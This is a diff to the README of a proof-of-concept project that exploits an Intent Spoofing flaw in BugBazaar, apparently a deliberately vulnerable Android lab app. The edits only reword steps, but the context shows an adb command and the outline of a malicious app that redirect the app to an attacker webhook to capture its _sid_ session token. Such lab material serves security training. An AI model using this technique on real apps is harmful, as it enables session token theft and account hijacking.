@@ -11,7 +11,7 @@ This project can be used to exploit Intent Spoofing vulnerability in [BugBazaar]
 	- adb shell am start -d "bugbazaar://externalAuthentication" --es ExternalAuthLoginActivity.EXTRA_REDIRECT_URL https://webhookurl
 7. Add your webhook url here and check the logs of webhook. You can see the _sid_ token.
 8. To exploit this vulnerability via other app, create a new android project with empty activity.
-9. In MainActivity.java, add following code
+9. In MainActivity.java, add following code under onCreate method:
 	
         // Create a new Intent
         Intent intent = new Intent();
@@ -28,4 +28,4 @@ This project can be used to exploit Intent Spoofing vulnerability in [BugBazaar]
 
 10. Replace your webhook url here. 
 11. Run this application on same device where BugBazaar is installed.
-12. Check the webhook logs and you can see the _sid_ token.	
+12. Check the webhook logs and you will see the _sid_ token.	
